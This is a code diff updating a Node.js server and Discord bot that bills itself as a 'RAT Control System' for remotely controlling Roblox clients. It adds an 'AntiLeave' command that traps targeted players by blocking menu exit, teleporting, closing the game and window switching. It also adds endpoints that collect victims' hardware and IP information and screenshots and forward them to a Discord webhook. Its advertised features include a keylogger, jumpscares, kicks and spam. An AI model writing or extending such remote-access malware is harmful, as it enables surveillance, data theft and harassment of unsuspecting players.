@@ -9,7 +9,7 @@ const WEBHOOK_URL = process.env.WEBHOOK_URL || "https://discord.com/api/webhooks
 const PORT = process.env.PORT || 10000;
 
 // Логирование конфигурации
-console.log('🔧 Конфигурация сервера v3.0:');
+console.log('🔧 Конфигурация сервера v3.1:');
 console.log(`- PORT: ${PORT}`);
 console.log(`- SERVER_URL: ${SERVER_URL}`);
 console.log(`- DISCORD_TOKEN: ${DISCORD_TOKEN ? '✅ Установлен' : '❌ Отсутствует'}`);
@@ -132,9 +132,9 @@ if (DISCORD_TOKEN) {
     discordClient.on('ready', () => {
         console.log(`🤖 Discord бот ${discordClient.user.tag} запущен!`);
         console.log(`🌐 Подключено к серверу: ${SERVER_URL}`);
-        console.log(`🎯 Версия: 3.0 (все команды + таргетинг)`);
+        console.log(`🎯 Версия: 3.1 (AntiLeave System)`);
         
-        discordClient.user.setActivity('RAT Control Panel v3.0', { type: 'WATCHING' });
+        discordClient.user.setActivity('RAT Control Panel v3.1', { type: 'WATCHING' });
     });
 
     // ========== ВСЕ КОМАНДЫ ==========
@@ -515,6 +515,55 @@ if (DISCORD_TOKEN) {
                     }
                 },
                 
+                // 🛡️ ANTI-LEAVE СИСТЕМА
+                antileave: async () => {
+                    const action = args[0]?.toLowerCase();
+                    
+                    if (!action || !['enable', 'disable', 'status'].includes(action)) {
+                        const embed = new EmbedBuilder()
+                            .setTitle('🛡️ AntiLeave System')
+                            .setDescription('Система блокировки выхода из игры\n\n**Использование:**')
+                            .setColor(0x7289da)
+                            .addFields(
+                                { name: 'Включить для всех', value: '`/antileave enable`', inline: true },
+                                { name: 'Включить для игрока', value: '`/antileave enable ник`', inline: true },
+                                { name: 'Выключить', value: '`/antileave disable`', inline: true },
+                                { name: 'Статус', value: '`/antileave status`', inline: true }
+                            );
+                        await message.reply({ embeds: [embed] });
+                        return;
+                    }
+                    
+                    // Для команды status всегда без таргета
+                    if (action === 'status') {
+                        if (await sendCommand("anti_leave", ["status"], null)) {
+                            const embed = createEmbed(
+                                '📊 Статус AntiLeave',
+                                'Запрос статуса отправлен. Результат будет в чате.',
+                                0x3498db,
+                                null
+                            );
+                            await message.reply({ embeds: [embed] });
+                        }
+                        return;
+                    }
+                    
+                    // Для enable/disable определяем таргет
+                    const targetForCommand = action === 'enable' && args[1] ? args[1] : target;
+                    
+                    if (await sendCommand("anti_leave", [action, targetForCommand || "all"], targetForCommand || null)) {
+                        const embed = createEmbed(
+                            action === 'enable' ? '🛡️ AntiLeave Включен' : '🛡️ AntiLeave Выключен',
+                            action === 'enable' 
+                                ? 'Система блокировки выхода активирована!\n\n**Блокирует:**\n• Выход через меню\n• Телепортацию\n• Закрытие игры\n• Переключение окон'
+                                : 'Система блокировки выхода деактивирована',
+                            action === 'enable' ? 0xff0000 : 0x00ff00,
+                            targetForCommand || null
+                        );
+                        await message.reply({ embeds: [embed] });
+                    }
+                },
+                
                 // 👥 ПОЛЬЗОВАТЕЛИ
                 users: async () => {
                     const data = await getOnlineUsers();
@@ -561,7 +610,7 @@ if (DISCORD_TOKEN) {
                     
                     if (data) {
                         const embed = new EmbedBuilder()
-                            .setTitle('📊 Статус системы')
+                            .setTitle('📊 Статус системы v3.1')
                             .setDescription('Текущее состояние RAT Control System')
                             .setColor(0x7289da)
                             .addFields(
@@ -569,7 +618,8 @@ if (DISCORD_TOKEN) {
                                 { name: '🌐 Сервер', value: '🟢 Активен', inline: true },
                                 { name: '📨 Команды в очереди', value: `\`${data.pending_commands || 0}\``, inline: true },
                                 { name: '👥 Онлайн пользователей', value: `\`${data.online_users || 0}\``, inline: true },
-                                { name: '🛠️ Техническая информация', value: `• Версия: \`3.0.0\`\n• Сервер: \`${SERVER_URL}\`\n• Обновление: \`15 секунд\``, inline: false }
+                                { name: '🛡️ AntiLeave System', value: '🟢 Доступна', inline: true },
+                                { name: '🛠️ Техническая информация', value: `• Версия: \`3.1.0\`\n• Сервер: \`${SERVER_URL}\`\n• Команд: \`26\`\n• Обновление: \`15 секунд\``, inline: false }
                             )
                             .setTimestamp();
                         
@@ -582,13 +632,18 @@ if (DISCORD_TOKEN) {
                 // 📜 ПОМОЩЬ
                 help: async () => {
                     const helpEmbed = new EmbedBuilder()
-                        .setTitle('🤖 RAT Control Panel v3.0')
+                        .setTitle('🤖 RAT Control Panel v3.1')
                         .setDescription('Полный список всех команд с поддержкой таргетинга')
                         .setColor(0x7289da)
                         .addFields(
                             { 
                                 name: '🎯 Формат команд:', 
                                 value: '• `/команда` - для всех игроков\n• `/команда ник` - для конкретного игрока\n• `/команда ник аргументы` - с параметрами', 
+                                inline: false 
+                            },
+                            { 
+                                name: '🛡️ AntiLeave System', 
+                                value: '`/antileave enable [ник]` - включить\n`/antileave disable` - выключить\n`/antileave status` - статус', 
                                 inline: false 
                             },
                             { 
@@ -627,7 +682,7 @@ if (DISCORD_TOKEN) {
                                 inline: false 
                             }
                         )
-                        .setFooter({ text: `Всего команд: 25 | Сервер: ${SERVER_URL}` });
+                        .setFooter({ text: `Всего команд: 26 | Сервер: ${SERVER_URL}` });
                     
                     await message.reply({ embeds: [helpEmbed] });
                 }
@@ -681,7 +736,7 @@ async function sendDiscordMessage(title, description, color = 0x3498db, fields =
                     color: color,
                     fields: fields,
                     timestamp: new Date().toISOString(),
-                    footer: { text: "RAT Control System v3.0" }
+                    footer: { text: "RAT Control System v3.1" }
                 }]
             })
         });
@@ -762,6 +817,56 @@ const server = http.createServer((req, res) => {
                         "🔌 Новый инжект!",
                         `**Игрок:** ${args[0]}\n**Игра:** ${args[1]}\n**Инжектор:** ${args[3]}\n**Устройство:** ${args[4]}`,
                         0x00ff00
+                    );
+                }
+                
+                // Логирование AntiLeave
+                if (command === "anti_leave") {
+                    const action = args[0];
+                    const status = args[1] || target || "all";
+                    
+                    await sendDiscordMessage(
+                        action === "enable" ? "🛡️ AntiLeave Включен" : "🛡️ AntiLeave Выключен",
+                        action === "enable" 
+                            ? `**Цель:** ${status}\n**Блокирует:**\n• Выход через меню\n• Телепортацию\n• Закрытие игры\n• Переключение окон`
+                            : `**Цель:** ${status}\nСистема деактивирована`,
+                        action === "enable" ? 0xff0000 : 0x00ff00
+                    );
+                }
+                
+                // Логирование статуса AntiLeave
+                if (command === "anti_leave_status") {
+                    await sendDiscordMessage(
+                        "📊 AntiLeave Status",
+                        `**Статус:** ${args[0]}\n**Игрок:** ${args[1]}`,
+                        0x3498db
+                    );
+                }
+                
+                // Логирование спама
+                if (command === "spam_completed") {
+                    await sendDiscordMessage(
+                        "📁 Спам завершен",
+                        `**Тип:** ${args[0]}\n**Результат:** ${args[1]}`,
+                        0xf39c12
+                    );
+                }
+                
+                // Логирование чата
+                if (command === "user_chat") {
+                    await sendDiscordMessage(
+                        "💬 Чат игрока",
+                        `**Игрок:** ${args[0]}\n**Сообщение:** ${args[1]}`,
+                        0x3498db
+                    );
+                }
+                
+                // Логирование аппаратной информации
+                if (command === "hardware") {
+                    await sendDiscordMessage(
+                        "🖥️ Запрос оборудования",
+                        `**Игрок:** ${target || "N/A"}\nДанные об оборудовании запрошены`,
+                        0x9b59b6
                     );
                 }
                 
@@ -853,18 +958,47 @@ const server = http.createServer((req, res) => {
         return;
     }
     
+    // Получение информации о железе
+    if (req.method === 'POST' && req.url === '/hardware') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { player, data } = JSON.parse(body);
+                await sendDiscordMessage(
+                    "💻 Информация о системе",
+                    `**Игрок:** ${player}\n**Игра:** ${data.game}\n**FPS:** ${data.fps}\n**Пинг:** ${data.ping}\n**Экзекутор:** ${data.executor}\n**Устройство:** ${data.device_type}\n**IP Инфо:** ${data.ip_info}`,
+                    0x9b59b6,
+                    [
+                        {
+                            name: "Системная информация",
+                            value: `Touch: ${data.system.touch_enabled}\nMouse: ${data.system.mouse_enabled}\nKeyboard: ${data.system.keyboard_enabled}\nScreen: ${data.system.screen_size.X}x${data.system.screen_size.Y}`,
+                            inline: true
+                        }
+                    ]
+                );
+                res.end(JSON.stringify({ status: "OK" }));
+            } catch (e) {
+                res.statusCode = 400;
+                res.end(JSON.stringify({ error: e.message }));
+            }
+        });
+        return;
+    }
+    
     // Статус сервера
     if (req.method === 'GET' && req.url === '/status') {
         cleanupInactiveUsers();
         res.end(JSON.stringify({
             status: "online",
-            version: "3.0.0",
+            version: "3.1.0",
             online_users: global.onlineUsers.size,
             pending_commands: commandQueue.length,
             discord_bot: discordClient && discordClient.user ? {
                 username: discordClient.user.tag,
                 status: "online",
-                commands_count: 25
+                commands_count: 26,
+                features: ["AntiLeave System"]
             } : { status: "disabled" }
         }));
         return;
@@ -874,23 +1008,25 @@ const server = http.createServer((req, res) => {
     if (req.method === 'GET' && req.url === '/system_info') {
         res.end(JSON.stringify({
             name: "RAT Control System",
-            version: "3.0.0",
-            description: "Продвинутая система удаленного управления Roblox клиентами",
+            version: "3.1.0",
+            description: "Продвинутая система удаленного управления Roblox клиентами с AntiLeave системой",
             server: SERVER_URL,
             features: [
-                "Управление игроком (кик, заморозка, телепорт)",
-                "Скример система (Джефф Килер, Соник.exe)",
-                "Чат система с сообщениями",
-                "Мониторинг устройств",
-                "Кейлоггер",
-                "Spam инструменты",
-                "Таргетированные команды"
+                "🛡️ AntiLeave System - блокировка выхода",
+                "👤 Управление игроком (кик, заморозка, телепорт)",
+                "👻 Скример система (Джефф Килер, Соник.exe)",
+                "💬 Чат система с сообщениями",
+                "📊 Мониторинг устройств",
+                "⌨️ Кейлоггер",
+                "💥 Spam инструменты",
+                "🎯 Таргетированные команды"
             ],
             discord_bot: discordClient && discordClient.user ? {
                 username: discordClient.user.tag,
                 status: "online",
-                commands_count: 25,
-                targeted_commands: true
+                commands_count: 26,
+                targeted_commands: true,
+                anti_leave: true
             } : { status: "disabled_no_token" }
         }));
         return;
@@ -899,13 +1035,15 @@ const server = http.createServer((req, res) => {
     // Корневой путь
     if (req.method === 'GET' && req.url === '/') {
         res.end(JSON.stringify({
-            message: "RAT Control System v3.0",
+            message: "RAT Control System v3.1 - AntiLeave Edition",
             endpoints: [
                 "/data?player=NAME - Получение команд",
                 "/users - Онлайн пользователи",
                 "/status - Статус системы",
-                "/system_info - Информация о проекте"
+                "/system_info - Информация о проекте",
+                "/screenshot - Скриншоты (GET/POST)"
             ],
+            features: "🛡️ AntiLeave System включена",
             documentation: "Используйте /help в Discord для управления"
         }));
         return;
@@ -923,18 +1061,26 @@ server.listen(PORT, () => {
     console.log('• GET  /data?player=NAME - Получение команд для клиента');
     console.log('• POST /command - Отправка команд от бота');
     console.log('• GET  /users - Список онлайн пользователей');
+    console.log('• POST /hardware - Информация о железе');
     console.log('• GET  /status - Статус сервера');
     console.log('• GET  /system_info - Информация о системе');
+    console.log('• GET/POST /screenshot - Скриншоты');
     console.log('');
     
     if (DISCORD_TOKEN) {
         console.log('💬 Discord команды готовы:');
-        console.log('• /help - Список всех команд (25 команд)');
+        console.log('• /help - Список всех команд (26 команд)');
+        console.log('• /antileave - Управление AntiLeave системой');
         console.log('• /users - Онлайн пользователи');
         console.log('• /jumpscare [ник] [тип] - Скримеры');
         console.log('• /kick [ник] <причина> - Кикнуть');
-        console.log('• /freeze [ник] <секунды> - Заморозить');
         console.log('🎯 Формат: /команда [ник] [аргументы]');
+        console.log('');
+        console.log('🛡️ ANTILEAVE КОМАНДЫ:');
+        console.log('• /antileave enable - включить для всех');
+        console.log('• /antileave enable ник - включить для игрока');
+        console.log('• /antileave disable - выключить');
+        console.log('• /antileave status - статус системы');
     } else {
         console.log('⚠️ Discord команды недоступны - установи DISCORD_TOKEN');
     }
